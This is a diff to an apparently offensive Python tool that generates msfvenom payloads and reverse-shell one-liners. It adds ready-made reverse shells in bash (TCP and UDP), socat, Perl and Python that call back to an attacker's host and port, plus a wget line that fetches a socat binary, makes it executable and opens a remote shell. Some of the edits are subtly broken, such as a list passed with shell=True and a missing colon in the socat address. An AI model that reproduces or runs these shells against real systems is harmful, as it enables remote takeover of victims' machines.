@@ -103,7 +103,7 @@ def askformat():
 
 def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
     try:
-        subprocess.run(f"msfvenom {args1} -p {payloadandsession} LHOST={lhost} LPORT={lport} {args2} -o {outfile}", check=True,shell=True)   
+        subprocess.run(["msfvenom", args1,"-p", payloadandsession, "LHOST=", lhost ,"LPORT=", lport, args2, "-o", outfile], check=True,shell=True)   
     except:
         print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
     else: 
@@ -127,7 +127,7 @@ def msfgen():
     args1 = inputc(f"Enter msfvenom args {colorama.Fore.LIGHTRED_EX}({colorama.Fore.LIGHTYELLOW_EX}msfvenom {colorama.Fore.LIGHTRED_EX}<{colorama.Fore.WHITE}msfvenom args{colorama.Fore.LIGHTRED_EX}>{colorama.Fore.BLUE} <payload> <payload args>{colorama.Fore.LIGHTRED_EX}){colorama.Fore.LIGHTYELLOW_EX}: ")
     args2 = inputc(f"Enter msfvenom args {colorama.Fore.LIGHTRED_EX}({colorama.Fore.LIGHTYELLOW_EX}msfvenom <msfvenom args> <payload> {colorama.Fore.LIGHTRED_EX}<{colorama.Fore.WHITE}payload args{colorama.Fore.LIGHTRED_EX}>{colorama.Fore.BLUE}{colorama.Fore.LIGHTRED_EX}){colorama.Fore.LIGHTYELLOW_EX}: ")
     try:
-        subprocess.run(f"msfvenom {args1} -p {payyload} {args2}", check=True,shell=True)   
+        subprocess.run(["msfvenom", args1, "-p", payyload, args2], check=True,shell=True)   
     except:
         print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
     else: 
@@ -206,7 +206,6 @@ def pythonpayloadfud():
         file.write(outpy)
     print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
     input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)   
-    n = 1  
 
 
 def winpayload():                         
@@ -323,6 +322,7 @@ def linuxpayloadmenu():
         linuxpayloadmenu()  
 
 def miscmenu():
+    global n
     print(colorama.Fore.LIGHTRED_EX + "NOT READY YET!!!" + colorama.Style.RESET_ALL)
     n = 1 
     printopt("")
@@ -374,7 +374,7 @@ def search():
 def search2(searchstring):
     matchingplds = [foundplds for foundplds in pldlist if searchstring in foundplds ]  
     for item in matchingplds:
-        searchresult = print(colorama.Fore.LIGHTRED_EX + "==> " + colorama.Fore.LIGHTWHITE_EX + item + colorama.Style.RESET_ALL)    
+        return print(colorama.Fore.LIGHTRED_EX + "==> " + colorama.Fore.LIGHTWHITE_EX + item + colorama.Style.RESET_ALL)    
 
 def menu():
     global n
@@ -487,7 +487,7 @@ formatlist.append("[6] py")
 formatlist.append("[7] bash")
 formatlist.append("[8] sh")
 
-
+# Bash Reverse TCP Shell
 def bash_tcp_v_string1(lhost, lport):
     return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
 def bash_tcp_v_string2(lhost,lport):
@@ -497,17 +497,32 @@ def bash_tcp_v_string3(lhost, lport):
 def bash_tcp_a_string(lhost, lport):
     None
 
+# Bash Reverse UDP Shell
 def bash_udp_v_string(lhost, lport):
     return f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1"
 def bash_udp_a_string(lport):
     return f"nc -u -lvp {lport}"
 
-def socat_v_string(lhost, lport):
+# Socat Reverse TCP
+def socat_v_string1(lhost, lport):
     return f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
+def socat_v_string2(lhost, lport):
+    return f"wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp{lhost}:{lport}"    
 def socat_a_string(lport):
     return  f"socat file:`tty`,raw,echo=0 TCP-L:{lport}"   
 
+# Perl Reverse TCP
+def perl_v_string1(lhost, lport):
+    #Linux only
+    return "perl -e 'use Socket;$i="+ str(lhost) + ";$p=" + str(lport) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+def perl_v_string2(lhost, lport):
+    return "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr," + f"{lhost}:{lport}" + ");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"    
+def perl_v_string3(lhost, lport):
+    return "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr," + f"{lhost}:{lport}" +");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 
+# Python Reverse TCP 
+def python_v_string1(lhost, lport):
+    return f"python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(({lhost},int({lport})));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
 
 def main():
     #there for future stuff
@@ -523,7 +538,7 @@ def main():
             except KeyboardInterrupt:
                 print("Exiting...")  
                 time.sleep(0.1)  
-                sys.exit()
+                sys.exit()                
 colorama.init()  
 main()
                                                      
